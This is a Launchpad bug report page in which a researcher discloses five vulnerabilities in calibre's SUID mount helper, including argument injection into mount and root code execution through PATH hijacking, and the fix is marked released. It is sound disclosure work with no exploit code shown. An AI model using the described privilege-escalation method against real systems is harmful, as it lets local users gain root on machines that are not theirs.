<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/calibre/+bug/885027/+index" />

    <meta charset="UTF-8" />
    <title>Bug #885027 “SUID Mount Helper has 5 Major Vulnerabilities” : Bugs : calibre</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/885027" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/885027/bug.atom" title="Bug 885027 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="Hello Calibre,

There are 5 separate vulnerabilities with the calibre SUID mount helper:

These vulnerabilities concern /src/calibre/devices/linux_mount_helper.c.

1. Ability to create root owned directory anywhere. The mount helper calls mkdir(argv[3], ...) on line 48. 

2. Ability to remove any empty directory on the system. For example, line 172.

3. Ability to create and delete user_controlled_dir/.created_by_calibre_mount_helper anywhere on the filesystem, lines 55 and 165.

4. Ability t..." />
      <meta property="og:description" content="Hello Calibre,

There are 5 separate vulnerabilities with the calibre SUID mount helper:

These vulnerabilities concern /src/calibre/devices/linux_mount_helper.c.

1. Ability to create root owned directory anywhere. The mount helper calls mkdir(argv[3], ...) on line 48. 

2. Ability to remove any empty directory on the system. For example, line 172.

3. Ability to create and delete user_controlled_dir/.created_by_calibre_mount_helper anywhere on the filesystem, lines 55 and 165.

4. Ability t..." />
    

    
    
      <meta property="og:title" content="Bug #885027 “SUID Mount Helper has 5 Major Vulnerabilities” : Bugs : calibre" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/885027" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "apple-driver", "appstream", "bionic", "bisect-done", "bitesize", "catalogs", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "documentation", "fb2-output", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "kobo-driver", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "pdb-input", "pdb-output", "pdf-input", "pdf-output", "performing-bisect", "preprocessing", "py2-removal", "qt4-removal", "rb-input", "rb-output", "regression-proposed", "regression-release", "regression-update", "rtf-input", "rtf-output", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "txt-input", "txt-output", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "website", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/calibre/+bug/885027/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/calibre"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49153010/library64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/calibre">calibre</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/calibre">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/calibre">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/calibre">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/calibre">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/calibre">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/calibre">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    SUID Mount Helper has 5 Major Vulnerabilities
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #885027 reported by
      <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld</a>
      <time title="2011-11-02 01:21:40 UTC" datetime="2011-11-02T01:21:40.477375+00:00">on 2011-11-02</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">402</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 22 people</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary1050389">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/calibre/+bug/885027/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1050389">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/calibre">calibre</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/calibre/+bug/885027/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/calibre/+bug/885027/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1050389">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1050389">
     <td colspan="7"><form action="/calibre/+bug/885027/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/calibre">calibre</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2011-11-02 01:21:40 UTC" datetime="2011-11-02T01:21:40.477375+00:00">2011-11-02</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2011-11-02 12:45:34 UTC" datetime="2011-11-02T12:45:34.416968+00:00">2011-11-02</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2011-11-04 20:27:13 UTC" datetime="2011-11-04T20:27:13.269707+00:00">2011-11-04</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2011-11-04 20:27:13 UTC" datetime="2011-11-04T20:27:13.269707+00:00">2011-11-04</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="calibre.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="calibre.target.option.package" name="calibre.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="calibre.target.distribution" name="calibre.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="calibre.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="calibre.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="calibre.target.package"
                         name="calibre.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;calibre.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('calibre.target.package');
              var select_menu = Y.DOM.byId('calibre.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-calibre-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": null, "step_title": "Search by name", "header": "Select a package", "vocabulary_filters": [], "show_create_team": false, "input_element": "calibre.target.package", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "DistributionPackage", "show_widget_id": "show-widget-calibre-target-package"};
        var show_widget_id = 'show-widget-calibre-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="calibre.target.option.product" name="calibre.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="calibre" id="calibre.target.product"
                         name="calibre.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;calibre.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('calibre.target.product');
              var select_menu = Y.DOM.byId('calibre.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-calibre-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": "calibre", "step_title": "Search", "header": "Select a project", "vocabulary_filters": [], "show_create_team": false, "input_element": "calibre.target.product", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "Product", "show_widget_id": "show-widget-calibre-target-product"};
        var show_widget_id = 'show-widget-calibre-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="calibre.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="calibre.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="calibre.status" name="calibre.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="calibre.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceUNDECIDED">Undecided</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="calibre.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="calibre.assignee.assign_to_nobody" name="calibre.assignee.option" value="calibre.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="calibre.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="calibre.assignee.assign_to_me" name="calibre.assignee.option" value="calibre.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="calibre.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="calibre.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="calibre.comment_on_change" name="calibre.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary1050867">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/calibre/+bug/885027/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1050867">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/calibre" title="Latest release: 5.31.1+dfsg-1, uploaded to main on 2021-10-29 16:26:47.380807+00:00 by Calibre maintainer team (team+calibre), maintained by Calibre maintainer team (team+calibre)">calibre (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/calibre/+bug/885027/+editstatus" style="float: left" class="value statusINVALID">Invalid</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/calibre/+bug/885027/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1050867">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1050867">
     <td colspan="7"><form action="/ubuntu/+source/calibre/+bug/885027/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/+source/calibre">calibre (Ubuntu)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~lfaraone" class="sprite person">Luke Faraone</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2011-11-02 20:26:05 UTC" datetime="2011-11-02T20:26:05.517122+00:00">2011-11-02</time>
      </td>
    </tr>
    
    
    
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2011-11-03 18:49:00 UTC" datetime="2011-11-03T18:49:00.946999+00:00">2011-11-03</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ubuntu_calibre.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ubuntu_calibre.target.option.package" name="ubuntu_calibre.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ubuntu_calibre.target.distribution" name="ubuntu_calibre.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ubuntu_calibre.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ubuntu_calibre.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="calibre" id="ubuntu_calibre.target.package"
                         name="ubuntu_calibre.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_calibre.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_calibre.target.package');
              var select_menu = Y.DOM.byId('ubuntu_calibre.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_calibre-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": "calibre", "step_title": "Search by name", "header": "Select a package", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_calibre.target.package", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "DistributionPackage", "show_widget_id": "show-widget-ubuntu_calibre-target-package"};
        var show_widget_id = 'show-widget-ubuntu_calibre-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="ubuntu_calibre.target.option.product" name="ubuntu_calibre.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ubuntu_calibre.target.product"
                         name="ubuntu_calibre.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_calibre.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_calibre.target.product');
              var select_menu = Y.DOM.byId('ubuntu_calibre.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_calibre-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": null, "step_title": "Search", "header": "Select a project", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_calibre.target.product", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "Product", "show_widget_id": "show-widget-ubuntu_calibre-target-product"};
        var show_widget_id = 'show-widget-ubuntu_calibre-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_calibre.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_calibre.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_calibre.status" name="ubuntu_calibre.status" size="1" >
<option selected="selected" value="Invalid">Invalid</option>
</select>
</div>
<input name="ubuntu_calibre.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceUNDECIDED">Undecided</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_calibre.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_calibre.assignee.assign_to_nobody" name="ubuntu_calibre.assignee.option" value="ubuntu_calibre.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_calibre.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_calibre.assignee.assign_to_me" name="ubuntu_calibre.assignee.option" value="ubuntu_calibre.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_calibre.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_calibre.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_calibre.comment_on_change" name="ubuntu_calibre.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/calibre/+bug/885027/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>Hello Calibre,</p>
<p>There are 5 separate vulnerabilities with the calibre SUID mount helper:</p>
<p>These vulnerabilities concern /src/calibre/<wbr />devices/<wbr />linux_mount_<wbr />helper.<wbr />c.</p>
<p>1. Ability to create root owned directory anywhere. The mount helper calls mkdir(argv[3], ...) on line 48.</p>
<p>2. Ability to remove any empty directory on the system. For example, line 172.</p>
<p>3. Ability to create and delete user_controlled<wbr />_dir/.created_<wbr />by_calibre_<wbr />mount_helper anywhere on the filesystem, lines 55 and 165.</p>
<p>4. Ability to inject arguments into &#x27;mount&#x27; being exec&#x27;d. On lines 78, 81, and 83, the final two arguments to mount are user controlled. On lines 1033, 106, 108, 139, and 141, the last argument to unmount/eject is user controlled. The &quot;exists()&quot; check can be subverted via race condition or by creating an existing file in the working directory with a filename equal to the desired injected argument.</p>
<p>5. Ability to execute any program as root. The mount helper makes use of execlp on lines 78, 81, 83, 103, 106, 108, 139, and 141, and the first argument does not start with a / character. Because of this, execlp will search PATH for the executable to run. PATH is user controlled, and thus it is trivial to write a program that spawns a shell and give it &quot;mount&quot; as a filename, and direct PATH to its directory. A proof of concept of this is attached.</p>
<p>Thanks,<br />
Jason Donenfeld</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
          
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
